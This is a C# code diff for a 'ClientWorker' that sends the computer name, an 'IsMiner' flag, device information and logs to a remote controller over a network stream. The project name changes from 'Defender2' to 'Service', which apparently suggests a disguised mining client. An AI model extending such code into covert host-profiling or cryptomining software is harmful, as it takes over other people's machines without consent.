@@ -125,32 +125,45 @@ namespace ClientWorker
             NetworkStream stream = Program.netSender.netStream;
             byte[] bytes;
 
-            bytes = Encoding.Unicode.GetBytes(Defender2.Properties.Settings.Default.Comp_name + StartData.delimiter +
-                Defender2.Properties.Settings.Default.IsMiner + StartData.delimiter +
-                Defender2.Properties.Settings.Default.Open_sum + StartData.delimiter +
-                Defender2.Properties.Settings.Default.Start_time + StartData.delimiter +
-                Defender2.Properties.Settings.Default.Version);
+            bytes = Encoding.Unicode.GetBytes("StartSetting" + StartData.delimiter+ Service.Properties.Settings.Default.Comp_name + StartData.delimiter +
+                Service.Properties.Settings.Default.IsMiner + StartData.delimiter +
+                Service.Properties.Settings.Default.Open_sum + StartData.delimiter +
+                Service.Properties.Settings.Default.Start_time + StartData.delimiter +
+                Service.Properties.Settings.Default.Version + StartData.delimiter + "EndSetting");
 
-            stream.Write(bytes, 0, bytes.Length);
-
-            bytes = Encoding.Unicode.GetBytes("EndSetting");
             stream.Write(bytes, 0, bytes.Length);
         }
+
         private void SendInfoDevice()
         {
+            InfoDevice.AskedInfoDevice();
 
+            NetworkStream stream = Program.netSender.netStream;
+            byte[] bytes;
+            string message = "StartInfoDevice" + StartData.delimiter;
+
+            List<string> messages = new List<string>();
+            messages.AddRange(InfoDevice.GetAllSettings());
+            foreach (string s in messages)
+            {
+                message += s + StartData.delimiter;
+            }
+
+            message += "EndInfoDevice";
+            bytes = Encoding.Unicode.GetBytes(message);
+            stream.Write(bytes, 0, bytes.Length);
         }
         private void SendLogList()
         {
             NetworkStream stream = Program.netSender.netStream;
             byte[] bytes;
+            string message= "StartLog"+StartData.delimiter;
             foreach (string s in Log.messages)
             {
-                bytes = Encoding.Unicode.GetBytes(s);
-                stream.Write(bytes, 0, bytes.Length);
-                Thread.Sleep(0);
+                message += s + StartData.delimiter;
             }
-            bytes = Encoding.Unicode.GetBytes("EndLog");
+            message += "EndLog";
+            bytes = Encoding.Unicode.GetBytes(message);
             stream.Write(bytes, 0, bytes.Length);
         }
 
